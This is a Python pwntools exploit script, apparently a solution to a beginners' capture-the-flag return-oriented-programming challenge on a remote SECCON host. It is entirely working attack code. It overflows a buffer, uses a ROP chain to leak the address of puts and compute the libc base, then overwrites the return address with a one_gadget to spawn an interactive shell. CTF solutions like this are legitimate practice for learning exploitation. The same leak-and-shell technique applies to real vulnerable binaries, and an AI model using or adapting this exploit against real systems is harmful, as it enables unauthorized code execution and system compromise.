from pwn import *

# p = process('chall')
p = remote('beginners-rop.quals.beginners.seccon.jp', 4102)
e = ELF('chall')
libc = ELF('libc-2.27.so')

pop_rdi = 0x401283
one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]

payload = b'A' * 0x108
payload += p64(pop_rdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendline(payload)
p.recvline()

libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['puts']
print(hex(libc.address))

payload = b'A' * 0x108
payload += p64(libc.address + one_gadget[0])

p.sendline(payload)

p.interactive()
